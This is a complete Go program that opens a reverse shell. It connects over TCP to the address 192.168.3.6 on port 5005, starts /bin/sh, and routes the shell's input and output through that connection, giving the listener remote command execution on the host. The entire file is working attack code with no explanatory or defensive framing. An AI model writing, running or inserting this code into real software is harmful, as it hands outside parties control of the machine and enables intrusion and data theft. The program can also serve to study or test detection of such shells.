package main

import (
	"net"
	"os/exec"
)

func main() {
	con, _ := net.Dial("tcp", "192.168.3.6:5005")
	cmd := exec.Command("/bin/sh")
	//Set input/output to the established connection's in/out
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}
